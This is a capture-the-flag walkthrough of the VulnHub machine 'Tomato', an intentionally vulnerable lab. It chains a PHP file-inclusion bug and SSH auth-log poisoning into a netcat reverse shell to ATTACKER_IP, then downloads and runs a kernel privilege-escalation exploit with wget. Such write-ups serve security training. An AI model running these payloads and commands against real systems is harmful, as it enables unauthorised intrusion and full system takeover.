# Tomato — VulnHub

**CTF:** VulnHub  
**Date:** 2025-10-09  
**Category:** pwn  
**Difficulty:** Grade 3  

---

## Summary

Tomato is a medium-to-hard VulnHub machine by SunCSR Team. The attack chain goes from LFI discovery, through SSH log poisoning to achieve RCE, and finally kernel exploitation to get root.

---

## Reconnaissance

```bash
nmap -A -p- 192.168.1.9
```

Open ports:

```
21/tcp   open  ftp     vsftpd
80/tcp   open  http    Apache
2211/tcp open  ssh     OpenSSH
8888/tcp open  http    Nginx (password-protected)
```

Port 8888 was protected with HTTP Basic Auth via `.htpasswd`.

---

## Enumeration

### Web — Port 80

The root page showed a tomato image. Ran `dirb` to find hidden content:

```bash
dirb http://192.168.1.9 /usr/share/wordlists/dirb/common.txt
```

Found `/antibot_image/antibots/info.php`. Checking the page source revealed a PHP comment:

```php
<?php include $_GET['image']; ?>
```

A clear **LFI hint** from the developer.

---

## Exploitation — LFI to RCE via SSH Log Poisoning

### Confirming LFI

```
http://192.168.1.9/antibot_image/antibots/info.php?image=../../../../../etc/passwd
```

Successfully read `/etc/passwd`. Then confirmed access to the SSH auth log:

```
http://192.168.1.9/antibot_image/antibots/info.php?image=../../../../../var/log/auth.log
```

Log entries were visible — perfect for poisoning.

### Injecting PHP into the Auth Log

Used SSH to inject PHP code as the username:

```bash
ssh '<?php system($_GET["shell"]); ?>'@192.168.1.9 -p 2211
```

Entered a random password to trigger the failed auth log entry containing the PHP payload.

### Triggering Execution

Set up a netcat listener:

```bash
nc -lvnp 443
```

Triggered the payload via LFI with a URL-encoded reverse shell:

```
http://192.168.1.9/antibot_image/antibots/info.php?image=../../../../../var/log/auth.log&shell=nc+ATTACKER_IP+443+-e+/bin/bash
```

Got a shell as `www-data`.

### Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Port 8888 Credentials

Found `.htpasswd` credentials via the LFI — cracked the hash with John using `kaonashi.txt`:

```bash
john --wordlist=kaonashi.txt hash.txt
```

The cracked password didn't map to either user on the system, so moved on.

---

## Privilege Escalation — Kernel Exploit (CVE-2017-16995)

Checked the kernel version:

```bash
uname -a
# Linux tomato 4.4.0-21-generic
```

Searched for a local privilege escalation exploit:

```bash
searchsploit 4.4.0-21
```

Found **CVE-2017-16995** — a kernel eBPF bug. The target had no GCC, so compiled on the attacker machine:

```bash
gcc exploit.c -o exploit
```

Transferred via Python HTTP server:

```bash
# Attacker
python3 -m http.server 80

# Target
wget http://ATTACKER_IP/exploit -O /tmp/exploit
chmod +x /tmp/exploit
/tmp/exploit
```

Got a root shell.

```bash
cat /root/proof.txt
```

---

## Flags

- **User flag** — found in a user home directory
- **Root flag** — `/root/proof.txt`
